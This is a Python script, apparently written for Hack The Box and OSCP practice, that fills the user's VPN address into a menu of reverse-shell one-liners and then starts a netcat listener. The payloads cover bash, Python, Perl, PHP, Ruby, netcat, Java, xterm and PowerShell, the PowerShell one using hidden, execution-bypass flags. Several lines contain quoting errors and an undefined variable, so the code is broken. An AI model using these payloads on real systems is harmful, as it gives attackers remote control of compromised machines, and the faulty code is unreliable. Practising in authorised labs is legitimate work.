#!/usr/bin/env python3
# -*- coding:utf-8 -*- 

#pip install colorama

__author__ = "ihebski, @KeyStrOke95 Thanks for Trolls"
__status__ = "Development 2k19"
__tags__ = "Hackthebox & OSCP"
import sys
import os
from colorama import Fore, Back, Style
import subprocess

#htbip = os.system('ip addr | grep tun0 | grep inet | grep 10. | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1')


def start(argv):
	if len(sys.argv) < 2:
		print('Dude, IP or Port???	 ¯\_(ツ)_/¯')
		sys.exit()
	else:
		if len(sys.argv) == 3:
			main(argv[0],int(argv[1]))
		else:   
			ip = os.popen("ip a s tun0").read().split("inet ")[1].split("/")[0]
			if len(ip) == 0 :
				print(Fore.RED, "VPN Connection lost!!!")
				sys.exit()
			main(ip,int(argv[0]))


def print_shell(ip,port,choice):
	if choice == 1:
		print(Fore.BLUE, '[+] Bash Payload')
		print(Fore.WHITE + f'bash -i >& /dev/tcp/{ip}/{port} 0>&1')
		print(Fore.WHITE + f'0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196')
		print(Fore.WHITE + f'You can also check for sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash')
		
	elif(choice == 2):
		print(Fore.BLUE, '[+] Python Payload')
		print(Fore.WHITE + f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
		print(Fore.WHITE + f"Python on Windows: C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect((\"{ip}\", {port})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"")

	elif(choice == 3):
		print(Fore.BLUE, '[+] Perl Payload')
		print(Fore.WHITE + f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'")
		print(Fore.WHITE + f"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{IP}\":{port});STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"")
		print(Fore.WHITE + f"Perl on Windows: perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'")

	elif(choice == 4):
		print(Fore.BLUE, '[+] PHP Payload')
		print(Fore.WHITE + f"php -r '$sock=fsockopen(\"{ip}\",\"{port}\");exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
		print(Fore.WHITE + f"php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'")
		
	elif(choice == 5):
		print(Fore.BLUE, '[+] Ruby Payload')
		print(Fore.WHITE + f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
		print(Fore.WHITE + f"ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'")
		
	elif(choice == 6):
		print(Fore.BLUE, '[+] Netcat Payload')
		print(Fore.RED, 'Payload 01 => ', Fore.WHITE + '\n' + f'nc -e /bin/sh {ip} {port}')
		print(Fore.RED, 'Payload 02 => ', Fore.WHITE + '\n' + f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f')
		
	elif(choice == 7):
		print(Fore.BLUE, '[+] Java Payload')
		print(Fore.WHITE, f"r = Runtime.getRuntime()p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip!s}/{port!s};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])p.waitFor()")
		
	elif(choice == 8):
		print(Fore.BLUE, '[+] xTerm Payload')
		print(Fore.WHITE, f'xterm -display {ip}:1')
		
	elif(choice == 9):
		print(Fore.BLUE, '[+] Powershell Payload')
		print(Fore.WHITE + f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port})' + ';$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()')
		print(Fore.WHITE + f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()')
		
		
	else:
		print("\n\t\t[-]Wrong Choice")
		main(ip,port)
		
		
def main(ip,port):
	print("[+] IP Address in use ", ip)

	print(Fore.GREEN + "\nThe current ip:="+ip + Fore.GREEN + "\tThe current port:="+str(port)  +"\n" )
	print(Fore.YELLOW + "[1].BASH REVERSE SHELL\n")
	print(Fore.RED +	"[2].PYTHON REVERSE SHELL\n")
	print(Fore.GREEN +  "[3].PERL REVERSE SHELL\n")
	print(Fore.YELLOW + "[4].PHP REVERSE SHELL\n")
	print(Fore.RED +	"[5].RUBY REVERSE SHELL\n")
	print(Fore.YELLOW + "[6].NETCAT REVERSE SHELL\n")
	print(Fore.GREEN +  "[7].JAVA REVERSE SHELL\n")
	print(Fore.RED +	"[8].XTERM REVERSE SHELL\n")
	print(Fore.YELLOW + "[9].POWERSHELL REVERSE SHELL\n")
	choice = int(input(Fore.RED + "Enter YOUR CHOICE:="))
	print_shell(ip, port, choice)
	
	print(Fore.GREEN, '\n[+] Incoming shell *-*', end='')
	if port > 1023:
		cmd = f'nc -lnvp {port}'
		print('\033[39m')
	else:
		cmd = f'sudo nc -lnvp {port}'
		print(Fore.RED, 'with sudo', '\033[39m')
	subprocess.call([cmd], shell=True)

if __name__ == '__main__':
	try:
		start(sys.argv[1:])
	except KeyboardInterrupt as err:
		print("\n[!] :)")
		sys.exit(0)
